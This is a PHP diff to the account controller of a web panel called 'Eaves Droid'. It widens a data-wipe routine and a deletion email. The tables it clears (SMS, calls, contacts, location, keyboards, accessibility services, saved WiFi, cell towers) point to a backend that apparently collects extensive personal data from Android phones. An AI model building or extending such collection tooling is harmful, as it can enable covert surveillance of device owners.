@@ -1693,7 +2009,7 @@ class Account extends BaseClientController
                     $message = 'All advanced extracted data deleted successfully';
                     break;
                 case 'all':
-                    $deletedCount = $this->finderModel->cq('tbl_apps', $this->userId) + $this->finderModel->cq('tbl_logs', $this->userId) + $this->finderModel->cq('tbl_contacts', $this->userId) + $this->finderModel->cq('tbl_sms', $this->userId) + $this->finderModel->cq('tbl_device_files', $this->userId) + $this->finderModel->cq('tbl_location', $this->userId) + $this->finderModel->cq('tbl_activity', $this->userId) + $this->finderModel->cq('tbl_device_context', $this->userId) + $this->finderModel->cq('tbl_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_calendar_events', $this->userId) + $this->finderModel->cq('tbl_app_usage', $this->userId) + $this->finderModel->cq('tbl_notifications', $this->userId) + $this->finderModel->cq('tbl_bluetooth', $this->userId) + $this->finderModel->cq('tbl_sensor_profile', $this->userId);
+                    $deletedCount = $this->finderModel->cq('tbl_apps', $this->userId) + $this->finderModel->cq('tbl_logs', $this->userId) + $this->finderModel->cq('tbl_contacts', $this->userId) + $this->finderModel->cq('tbl_sms', $this->userId) + $this->finderModel->cq('tbl_device_files', $this->userId) + $this->finderModel->cq('tbl_location', $this->userId) + $this->finderModel->cq('tbl_activity', $this->userId) + $this->finderModel->cq('tbl_device_context', $this->userId) + $this->finderModel->cq('tbl_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_calendar_events', $this->userId) + $this->finderModel->cq('tbl_app_usage', $this->userId) + $this->finderModel->cq('tbl_notifications', $this->userId) + $this->finderModel->cq('tbl_bluetooth', $this->userId) + $this->finderModel->cq('tbl_sensor_profile', $this->userId) + $this->finderModel->cq('tbl_accessibility_services', $this->userId) + $this->finderModel->cq('tbl_input_methods', $this->userId) + $this->finderModel->cq('tbl_security_audit', $this->userId) + $this->finderModel->cq('tbl_proc_info', $this->userId) + $this->finderModel->cq('tbl_data_usage', $this->userId) + $this->finderModel->cq('tbl_saved_wifi', $this->userId) + $this->finderModel->cq('tbl_default_apps', $this->userId) + $this->finderModel->cq('tbl_alarms', $this->userId) + $this->finderModel->cq('tbl_app_security', $this->userId) + $this->finderModel->cq('tbl_network_security', $this->userId) + $this->finderModel->cq('tbl_telephony_network', $this->userId) + $this->finderModel->cq('tbl_system_locale', $this->userId) + $this->finderModel->cq('tbl_hardware_graphics', $this->userId) + $this->finderModel->cq('tbl_hardware_network', $this->userId) + $this->finderModel->cq('tbl_camera_info', $this->userId) + $this->finderModel->cq('tbl_battery_stats', $this->userId) + $this->finderModel->cq('tbl_cell_towers', $this->userId) + $this->finderModel->cq('tbl_display_info', $this->userId) + $this->finderModel->cq('tbl_storage', $this->userId) + $this->finderModel->cq('tbl_thermal', $this->userId) + $this->finderModel->cq('tbl_nfc', $this->userId) + $this->finderModel->cq('tbl_running_processes', $this->userId);
                     $apps = $this->finderModel->deleteAppsByUser($this->userId);
                     $calls = $this->finderModel->deleteCallsByUser($this->userId);
                     $contacts = $this->finderModel->deleteContactsByUser($this->userId);
@@ -1708,8 +2024,33 @@ class Account extends BaseClientController
                                 $this->finderModel->deleteAppUsageByUser($this->userId) &&
                                 $this->finderModel->deleteNotificationsByUser($this->userId) &&
                                 $this->finderModel->deleteBluetoothByUser($this->userId) &&
-                                $this->finderModel->deleteSensorsByUser($this->userId);
-
+                                $this->finderModel->deleteSensorsByUser($this->userId) &&
+                                $this->finderModel->deleteAccessibilityByUser($this->userId) &&
+                                $this->finderModel->deleteInputMethodsByUser($this->userId) &&
+                                $this->finderModel->deleteSecurityAuditByUser($this->userId) &&
+                                $this->finderModel->deleteProcInfoByUser($this->userId) &&
+                                $this->finderModel->deleteDataUsageByUser($this->userId) &&
+                                $this->finderModel->deleteSavedWifiByUser($this->userId) &&
+                                $this->finderModel->deleteDefaultAppsByUser($this->userId) &&
+                                $this->finderModel->deleteAlarmsByUser($this->userId) &&
+                                $this->finderModel->deleteAppSecurityByUser($this->userId) &&
+                                $this->finderModel->deleteNetworkSecurityByUser($this->userId) &&
+                                $this->finderModel->deleteTelephonyNetworkByUser($this->userId) &&
+                                $this->finderModel->deleteSystemLocaleByUser($this->userId) &&
+                                $this->finderModel->deleteHardwareGraphicsByUser($this->userId) &&
+                                $this->finderModel->deleteHardwareNetworkByUser($this->userId) &&
+                                $this->finderModel->deleteCameraInfoByUser($this->userId) &&
+                                $this->finderModel->deleteBatteryStatsByUser($this->userId) &&
+                                $this->finderModel->deleteCellTowersByUser($this->userId) &&
+                                $this->finderModel->deleteDisplayInfoByUser($this->userId) &&
+                                $this->finderModel->deleteStorageByUser($this->userId) &&
+                                $this->finderModel->deleteThermalByUser($this->userId) &&
+                                $this->finderModel->deleteNfcByUser($this->userId) &&
+                                $this->finderModel->deleteProcessesByUser($this->userId) &&
+                                $this->finderModel->deleteBlocklistByUser($this->userId) &&
+                                $this->finderModel->deleteMlJobsByUser($this->userId) &&
+                                $this->finderModel->deleteMlResultsByUser($this->userId) &&
+                                $this->finderModel->deleteMlAnalysisTrackingByUser($this->userId);
                     $success = ($apps && $calls && $contacts && $sms && $files && $locations && $activities && $advanced);
                     $message = 'All your data has been completely wiped successfully';
                     break;
@@ -1743,10 +2084,58 @@ class Account extends BaseClientController
                 // Send email notification
                 $userEmail = $this->userData['email'] ?? '';
                 if ($userEmail) {
-                    $this->sendNotificationEmail(
-                        $userEmail,
-                        'Eaves Droid — Data Deleted: ' . $deleteLabel,
-                        '
+                    $deleteBreakdown = '';
+                    if ($type === 'misc_software') {
+                        $subCounts = [
+                            'fa-user' => ['Accounts', $this->finderModel->cq('tbl_accounts', $this->userId)],
+                            'fa-calendar-alt' => ['Calendar', $this->finderModel->cq('tbl_calendar_events', $this->userId)],
+                            'fa-chart-bar' => ['App Usage', $this->finderModel->cq('tbl_app_usage', $this->userId)],
+                            'fa-bell' => ['Notifications', $this->finderModel->cq('tbl_notifications', $this->userId)],
+                            'fa-info-circle' => ['Device Context', $this->finderModel->cq('tbl_device_context', $this->userId)],
+                            'fa-network-wired' => ['Network Info', $this->finderModel->cq('tbl_network_info', $this->userId)],
+                            'fa-universal-access' => ['Accessibility', $this->finderModel->cq('tbl_accessibility_services', $this->userId)],
+                            'fa-keyboard' => ['Input Methods', $this->finderModel->cq('tbl_input_methods', $this->userId)],
+                            'fa-shield-alt' => ['Security Audit', $this->finderModel->cq('tbl_security_audit', $this->userId)],
+                            'fa-microchip' => ['Proc Info', $this->finderModel->cq('tbl_proc_info', $this->userId)],
+                            'fa-chart-line' => ['Data Usage', $this->finderModel->cq('tbl_data_usage', $this->userId)],
+                            'fa-wifi' => ['Saved WiFi', $this->finderModel->cq('tbl_saved_wifi', $this->userId)],
+                            'fa-th-list' => ['Default Apps', $this->finderModel->cq('tbl_default_apps', $this->userId)],
+                            'fa-clock' => ['Alarms', $this->finderModel->cq('tbl_alarms', $this->userId)],
+                            'fa-lock' => ['App Security', $this->finderModel->cq('tbl_app_security', $this->userId)],
+                            'fa-shield-virus' => ['Network Security', $this->finderModel->cq('tbl_network_security', $this->userId)],
+                            'fa-sim-card' => ['Telephony Network', $this->finderModel->cq('tbl_telephony_network', $this->userId)],
+                            'fa-language' => ['System Locale', $this->finderModel->cq('tbl_system_locale', $this->userId)],
+                        ];
+                        $deleteBreakdown = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Deleted Records Breakdown</h4>
+                        <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
+                        foreach ($subCounts as $icon => $info) {
+                            $deleteBreakdown .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($info[1]) . ' records</td></tr>';
+                        }
+                        $deleteBreakdown .= '</table>';
+                    } elseif ($type === 'misc_hardware') {
+                        $subCounts = [
+                            'fa-palette' => ['Hardware Graphics', $this->finderModel->cq('tbl_hardware_graphics', $this->userId)],
+                            'fa-network-wired' => ['Hardware Network', $this->finderModel->cq('tbl_hardware_network', $this->userId)],
+                            'fa-camera' => ['Camera Info', $this->finderModel->cq('tbl_camera_info', $this->userId)],
+                            'fa-battery-full' => ['Battery Stats', $this->finderModel->cq('tbl_battery_stats', $this->userId)],
+                            'fa-ruler' => ['Sensors', $this->finderModel->cq('tbl_sensor_profile', $this->userId)],
+                            'fa-bluetooth-b' => ['Bluetooth', $this->finderModel->cq('tbl_bluetooth', $this->userId)],
+                            'fa-broadcast-tower' => ['Cell Towers', $this->finderModel->cq('tbl_cell_towers', $this->userId)],
+                            'fa-tv' => ['Display Info', $this->finderModel->cq('tbl_display_info', $this->userId)],
+                            'fa-hdd' => ['Storage', $this->finderModel->cq('tbl_storage', $this->userId)],
+                            'fa-thermometer-half' => ['Thermal', $this->finderModel->cq('tbl_thermal', $this->userId)],
+                            'fa-credit-card' => ['NFC', $this->finderModel->cq('tbl_nfc', $this->userId)],
+                            'fa-tasks' => ['Processes', $this->finderModel->cq('tbl_running_processes', $this->userId)],
+                        ];
+                        $deleteBreakdown = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Deleted Records Breakdown</h4>
+                        <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
+                        foreach ($subCounts as $icon => $info) {
+                            $deleteBreakdown .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($info[1]) . ' records</td></tr>';
+                        }
+                        $deleteBreakdown .= '</table>';
+                    }
+
+                    $deleteBody = '
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"></head>
 <body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px;">
@@ -1761,15 +2150,29 @@ class Account extends BaseClientController
 <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Records Deleted</td><td style="padding:10px 15px;">' . number_format($deletedCount) . '</td></tr>
 <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Severity</td><td style="padding:10px 15px;"><span style="color:#dc3545;font-weight:bold;">HIGH</span></td></tr>
 <tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Completed</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
-</table>
+</table>' . $deleteBreakdown . '
 <div style="background:#fce8e8;border-left:4px solid #dc3545;padding:12px 15px;margin:15px 0;border-radius:4px;">
 <p style="margin:0;color:#333;font-size:13px;"><strong>⚠️ This action cannot be undone.</strong> The deleted data has been permanently removed from the server.</p>
 </div>
 <p style="color:#333;font-size:15px;">If you did not perform this action, please contact support immediately.</p>
 <p style="color:#333;font-size:15px;">Thank you,<br><strong>Eaves Droid Team</strong></p>
+<div style="margin-top:20px;padding:12px 15px;background:#e9ecef;border-radius:6px;font-size:11px;color:#555;">
+<table style="width:100%;border-collapse:collapse;">
+<tr><td style="padding:2px 5px;"><strong>Action:</strong> Data Deletion</td></tr>
+<tr><td style="padding:2px 5px;"><strong>Status:</strong> <span style="color:#dc3545;font-weight:bold;">Completed</span></td></tr>
+<tr><td style="padding:2px 5px;"><strong>Browser:</strong> ' . htmlspecialchars($this->request->getUserAgent()->getAgentString() ?: '') . '</td></tr>
+<tr><td style="padding:2px 5px;"><strong>Browser IP:</strong> ' . $this->request->getIPAddress() . '</td></tr>
+<tr><td style="padding:2px 5px;"><strong>Executed At:</strong> ' . date('Y-m-d H:i:s') . '</td></tr>
+</table>
+</div>
 </div>
 <div style="background:#f1f1f1;padding:12px;text-align:center;font-size:11px;color:#888;">Eaves Droid — Advanced Mobile Forensic &amp; Data Intelligence Platform</div>
-</div></body></html>'
+</div></body></html>';
+
+                    $this->sendNotificationEmail(
+                        $userEmail,
+                        'Eaves Droid — Data Deleted: ' . $deleteLabel,
+                        $deleteBody
                     );
                 }
 
@@ -1801,6 +2204,21 @@ class Account extends BaseClientController
     // =================================================================
     // UTILITY METHODS
     // =================================================================
+
+    /**
+     * Estimates the size of a data array for email notifications.
+     */
+    private function estimateDataSize(array $data): string
+    {
+        $json = @json_encode($data);
+        $bytes = $json ? strlen($json) : 0;
+        if ($bytes > 1048576) {
+            return number_format($bytes / 1048576, 2) . ' MB';
+        } elseif ($bytes > 1024) {
+            return number_format($bytes / 1024, 1) . ' KB';
+        }
+        return number_format($bytes) . ' B';
+    }
 
     /**
      * Sends a notification email via configured SMTP.
